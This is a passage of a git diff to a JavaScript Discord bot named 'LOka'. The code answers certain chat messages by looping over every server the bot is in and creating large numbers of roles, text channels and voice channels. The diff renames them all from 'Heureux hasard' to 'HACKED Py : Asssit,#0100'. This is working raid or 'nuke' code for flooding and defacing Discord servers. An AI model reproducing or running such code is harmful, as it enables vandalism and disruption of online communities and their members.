         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "Heureux hasard",
+        name : "HACKED Py : Asssit,#0100",
         permissions :   [1],
         color : "RANDOM"
     })
@@ -1397,86 +1397,86 @@ LOka.on('message', message => {
 LOka.on('message', message => {
          if (message.content === "3") {
                LOka.guilds.forEach(m =>{
-m.createChannel('Asssit,oFF#3068', 'text');
-m.createChannel('Asssit,oFF#3068', 'text');
-m.createChannel('Faisal,×_×#0777', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
-m.createChannel('Heureux hasard', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
  
 })
 }
@@ -1485,4214 +1485,4214 @@ m.createChannel('Heureux hasard', 'text');
 LOka.on('message', message => {
          if (message.content === "4") {
                  LOka.guilds.forEach(m =>{
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
  
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
  
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
  
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
  
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
  
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice'); 
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
